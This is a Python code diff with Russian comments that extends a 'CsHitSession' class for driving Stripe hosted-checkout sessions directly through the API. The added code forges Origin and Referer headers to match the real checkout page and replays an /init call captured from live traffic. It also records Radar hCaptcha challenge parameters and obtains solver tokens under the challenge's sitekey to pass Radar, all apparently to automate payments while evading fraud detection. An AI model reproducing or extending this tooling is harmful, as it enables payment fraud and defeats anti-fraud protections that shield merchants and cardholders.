@@ -86,6 +86,47 @@ def presentment_currency(data: dict, fallback: str = "") -> str:
     return str(data.get("currency") or inv.get("currency") or fallback or "").upper()
 
 
+def record_radar_challenge(cs: str, sdk: dict, stripe_js: dict) -> None:
+    """Записать, что именно требует интерактивный челлендж Radar (JSONL, строка на челлендж).
+
+    Про витрину видно только пассивный контур: `link_settings.hcaptcha_site_key` (24ed0064…) плюс
+    rqdata. Интерактивный челлендж приходит с ДРУГИМ site_key (c7faac4c…) и своим rqdata — ровно их
+    требует verify_challenge. Без этой записи «чем Kimi отличается от Meshy» приходится выяснять
+    попытками; с ней — сравнением. Сбой записи прогон не ломает.
+    """
+    try:
+        import json as _json
+        import os as _os
+        p = getattr(config, "RADAR_CHALLENGE_LOG", "data/radar_challenges.jsonl")
+        rec = {
+            "at": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "cs": cs,
+            "type": str(sdk.get("type") or ""),
+            "site_key": str(sdk.get("site_key") or stripe_js.get("site_key") or ""),
+            "rqdata": str(sdk.get("rqdata") or stripe_js.get("rqdata") or ""),
+            "rqdata_len": len(str(sdk.get("rqdata") or stripe_js.get("rqdata") or "")),
+            "verification_url": str(sdk.get("verification_url") or stripe_js.get("verification_url") or ""),
+            "sdk_keys": sorted(sdk.keys()),
+            "stripe_js_keys": sorted(stripe_js.keys()),
+        }
+        _os.makedirs(_os.path.dirname(p) or ".", exist_ok=True)
+        with open(p, "a", encoding="utf-8") as f:
+            f.write(_json.dumps(rec, ensure_ascii=False) + "\n")
+    except Exception:
+        pass
+
+
+def session_origin(url: str) -> str:
+    """Origin/Referer для confirm: hosted checkout шлёт СВОЮ страницу, а не js.stripe.com.
+
+    Живой перехват 2026-09-18 (Meshy, Chrome, CDP): страница отправляет confirm с
+    Origin=https://checkout.stripe.com и Referer=https://checkout.stripe.com/. Мы слали
+    js.stripe.com — это единственный заголовок, которым наш confirm отличался от страницы.
+    """
+    host = urlparse(str(url or "")).netloc or "checkout.stripe.com"
+    return f"https://{host}"
+
+
 def _amount_mismatch(status_code: int, err: dict) -> bool:
     """checkout_amount_mismatch живёт в error.code, error.decline_code ИЛИ в хвосте
     error.message (живой кейс 06.09.2026: code=None, message='...subscription.
@@ -261,6 +302,32 @@ class CsHitSession:
             self.expected_amount = presentment_amount(data) or self.amount
             self.presentment_currency = presentment_currency(data, self.currency)
 
+            # Шаг страницы, которого у нас не было: POST /init. Живой съём её трафика 2026-09-18
+            # показал этот вызов до confirm; тело короткое, ответ — состояние сессии. Сбой не критичен.
+            if getattr(config, "HIT_SESSION_INIT", True):
+                try:
+                    _o = session_origin(self.url)
+                    _init_body = {
+                        "key": self.pk,
+                        "eid": "NA",
+                        "browser_locale": getattr(config, "HIT_SESSION_LOCALE", "ru-RU"),
+                        "browser_timezone": getattr(config, "HIT_SESSION_TIMEZONE", "Europe/Moscow"),
+                        "redirect_type": "url",
+                    }
+                    r_init = await s.post(
+                        f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
+                        data=_init_body,
+                        headers={"Origin": _o, "Referer": _o + "/", "Accept": "application/json"},
+                        timeout=15,
+                    )
+                    gc.flag_internal_endpoint(r_init, f"https://api.stripe.com/v1/payment_pages/{self.cs}/init")
+                    _log.log_http("POST", f"payment_pages/{self.cs[:14]}/init", r_init.status_code)
+                    init_data = r_init.json() if r_init.status_code == 200 else {}
+                    if isinstance(init_data, dict) and init_data.get("init_checksum"):
+                        self.checksum = str(init_data["init_checksum"])
+                except Exception as e:
+                    _log.log_stripe("INIT_FAIL", self.cs[:14], type(e).__name__, str(e)[:70])
+
             cust = data.get("customer") or {}
             self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
             self.customer_name = str(cust.get("name") or "")
@@ -400,9 +467,10 @@ class CsHitSession:
             except Exception as e:
                 _log.log_stripe("CTOKEN_FALLBACK", td["id"], type(e).__name__, f"ctoken error: {e}, fallback to raw payment_method")
 
+        _origin = session_origin(self.url)
         confirm_headers = {
-            "Origin": "https://js.stripe.com",
-            "Referer": "https://js.stripe.com/",
+            "Origin": _origin,
+            "Referer": _origin + "/",
             "Accept": "application/json",
         }
         if telem.get("cookie_header"):
@@ -572,6 +640,7 @@ class CsHitSession:
                     verification_url = str(sdk.get("verification_url") or stripe_js.get("verification_url") or "")
                     sk_note = f"sitekey={sk[:8]}… " if sk else ""
                     _log.log_stripe("RADAR_CHALLENGE", self.cs[:14], "hCaptcha", sk_note.strip())
+                    record_radar_challenge(self.cs, sdk, stripe_js)
 
                     # Проверяем наличие солвера или предварительного токена
                     token = None
@@ -604,8 +673,26 @@ class CsHitSession:
                                 token = solver_res
                         except Exception as se:
                             _log.log_stripe("SOLVER_ERROR", self.cs[:14], type(se).__name__, str(se)[:80])
-                    elif self.hcaptcha_token:
+
+                    # Порядок добычи токена: солвер → токен ПОД SITEKEY ЧЕЛЛЕНДЖА → пассивный токен
+                    # витрины. Средний шаг обязателен: пассивный контур живёт на своём sitekey
+                    # (24ed0064…), а челлендж приходит с чужим (c7faac4c…) — токен чужого sitekey
+                    # Radar и отвергает. Живой замер 2026-09-18.
+                    if not token and sk and self.s is not None:
+                        try:
+                            ch_tok = await gc.fetch_hcaptcha_token_for_sitekey(self.s, sk, rqdata)
+                            if ch_tok:
+                                token = ch_tok
+                                _log.log_stripe("RADAR_TOKEN", self.cs[:14], sk[:8] + "…",
+                                                f"токен под sitekey челленджа, len={len(ch_tok)}")
+                                if not ekey and rqdata:
+                                    ekey = ""
+                        except Exception as _e:
+                            _log.log_stripe("RADAR_TOKEN_FAIL", self.cs[:14], type(_e).__name__, str(_e)[:60])
+                    if not token and self.hcaptcha_token:
                         token = self.hcaptcha_token
+                        _log.log_stripe("RADAR_TOKEN", self.cs[:14], "пассивный",
+                                        f"токен витрины, len={len(token)}")
 
                     # Если токен получен и сессия активна — диспатчим верификацию
                     if token and self.s is not None and recursion_depth < 2:
@@ -623,6 +710,7 @@ class CsHitSession:
                             client_secret=client_secret,
                             challenge_response_token=token,
                             challenge_response_ekey=ekey,
+                            origin=session_origin(self.url),
                         )
 
                         if v_res.get("status") == "CHALLENGE_PASSED":
@@ -648,8 +736,8 @@ class CsHitSession:
                                     resumed_url,
                                     data=resumed_body,
                                     headers={
-                                        "Origin": "https://js.stripe.com",
-                                        "Referer": "https://js.stripe.com/",
+                                        "Origin": session_origin(self.url),
+                                        "Referer": session_origin(self.url) + "/",
                                         "Accept": "application/json",
                                     },
                                     timeout=20,
